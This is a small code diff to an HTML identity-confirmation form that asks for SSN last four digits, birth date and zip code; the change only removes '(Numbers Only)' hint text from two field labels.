@@ -27,7 +27,7 @@
         <!-- Step 1 -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <label>Last 4 Digits of SSN <span style="color:red">(Numbers Only)</span></label>
+            <label>Last 4 Digits of SSN <span style="color:red"></span></label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
             <label>Birth Date</label>
@@ -46,7 +46,7 @@
         <!-- Step 2 -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
-            <label>Zip Code <span style="color:red">(Numbers Only)</span></label>
+            <label>Zip Code <span style="color:red"></span></label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
             <button class="continue" onclick="nextStep(3)">Continue</button>
         </div>
